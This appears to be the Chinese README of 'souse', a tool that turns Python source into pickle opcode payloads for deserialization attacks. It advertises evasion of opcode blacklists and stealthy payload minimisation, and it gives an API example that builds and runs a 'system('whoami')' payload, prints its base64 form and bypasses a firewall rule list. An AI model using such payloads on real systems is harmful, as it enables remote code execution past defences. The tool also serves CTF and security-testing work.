# souse
一个将 Python 源码全自动化转换为 Opcode (pickle) 的工具，源码即 Payload :)

[English Version](./README.md)

## 1. 帮助信息

<img src="https://raw.githubusercontent.com/Macr0phag3/souse/master/pics/help.png" width="600">

## 2. 核心特性

- **🚀 智能重构**: 自动将原本无法直接序列化的 Python 源码重构为完全兼容的 Pickle 指令流（例如：自动将下标赋值 `a[k]=v` 转换为 `__setitem__` 调用）。若涉及到较为复杂的源码转换，可以在 souse 之前，使用这个项目: [parselmouth](https://github.com/Macr0phag3/parselmouth)
- **✨ 自动化内置支持**: 自动识别并导出 `open`、`eval`、`getattr` 等 Python 内置函数，无需手动导入，开箱即用。
- **🛡️ 灵活防火墙绕过**: 针对 `R`、`o`、`i`、`u`、`b` 等核心指令提供多种自动化绕过方案，支持自定义指令禁用规则。
- **⚡ 极致 Payload 优化**: 内置 `pickletools` 优化逻辑，自动精简指令流，确保 Payload 体积最小且隐蔽性最高。
- **📦 多功能转换包装**: 支持 Base64、Hex、URL 等多种编码输出，并允许自定义转换函数序列。
- **📝 精准调试与上下文**: 提供带源码上下文的错误报告，精准定位不支持的语法结构，极大提升 Payload 开发效率。
- **🔍 Explain 解释器**: 命令行下可查看累计 opcode、栈变化以及每条 opcode 的语义说明，便于调试和分析。
- **💡 完善的 API 支持**: 除命令行外，支持通过 Python API 深度集成到自动化任务中。

opcode 利用情况见 [opcode](./opcodes.md)

## 3. 使用方法
### 3.1 命令行 (CLI)
`./souse/cases/` 目录下既有演示代码，也有用于回归测试的 case 样例。

#### 3.1.1 示例 1

源代码：

<img src="https://raw.githubusercontent.com/Macr0phag3/souse/master/pics/eg-1.png" width="300">

opcode:

<img src="https://raw.githubusercontent.com/Macr0phag3/souse/master/pics/eg-1-s.png" width="600">

#### 3.1.2 示例 2

源代码:

<img src="https://raw.githubusercontent.com/Macr0phag3/souse/master/pics/eg-2.png" width="300">

opcode:

<img src="https://raw.githubusercontent.com/Macr0phag3/souse/master/pics/eg-2-s.png" width="600">

#### 3.1.3 示例 3

你可以通过在源代码最后一行声明一个变量，来控制最终反序列化结果

```py
c=10
a = {}
a["empty"] = ""
c
```

#### 3.1.4 示例 4

转换后的 opcode:

<img src="https://raw.githubusercontent.com/Macr0phag3/souse/master/pics/eg-3.png" width="600">

支持的转换函数（调用 API 的时候可以自定义）:
- [x] base64_encode
- [x] hex_encode
- [x] url_encode

#### 3.1.5 测试代码

<img src="https://raw.githubusercontent.com/Macr0phag3/souse/master/pics/test.png" width="400">

#### 3.1.6 运行测试

```bash
python souse/souse.py --run-test
```

- 需要安装 `pytest`

开发时也可以直接运行完整测试集：

```bash
pytest -q
```

#### 3.1.7 查看 opcode explain

使用 `--explain` 可以在生成完成后输出 opcode 摘要和解释视图：

```bash
python souse/souse.py -f souse/cases/combo-6.py --explain
```

#### 3.1.8 防火墙规则格式

`--bypass` 使用逗号分隔的 opcode 列表:

```bash
python souse/souse.py -f tmp-test.py -p R,o,i
```

也可以传入规则文件，文件内容直接写成：

```text
R, o, i, \x81
```

### 3.2 API
示例:

```py
In [1]: import souse

In [2]: exp = "from os import system\nsystem('whoami')"

In [3]: souse.API(exp, optimized=True, transfer=pickle.loads).generate()
macr0phag3
Out[3]: 0

In [4]: import base64

In [5]: souse.API(exp, optimized=True, transfer=base64.b64encode).generate()
Out[5]: b'Y29zCnN5c3RlbQooVndob2FtaQp0Ui4='

In [6]: souse.API(exp, optimized=True, transfer=[bytes.decode, str.encode, base64.b64encode]).generate()
Out[6]: b'Y29zCnN5c3RlbQooVndob2FtaQp0Ui4='

In [7]: import pickle

In [8]: firewall_rules = [
    ...:     "V",
    ...:     "I01",
    ...:     "I",
    ...:     "R"
    ...: ]

In [9]: souse.API(exp, optimized=True, transfer=pickle.loads, firewall_rules=firewall_rules).generate()
[*] choice o to bypass rule: ['R'] x1
[*] choice S to bypass rule: ['V'] x1
macr0phag3
Out[9]: 0
```

## 4. 开发计划 (TODO)
- [x] 支持嵌套表达式 (Nested expressions)
- [x] 指令级防火墙绕过 (Opcode bypass)
- [x] 智能导入转换 (Lazy Import)
- [x] 智能属性/下标赋值转换
- [x] 转换后的代码回显示支持
- [x] Python API 支持
- [x] 源码级报错上下文提示
- [x] 自动化内置函数识别

---
## 其他
<img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" width="500">

[![Stargazers over time](https://starchart.cc/Macr0phag3/souse.svg)](https://starchart.cc/Macr0phag3/souse)
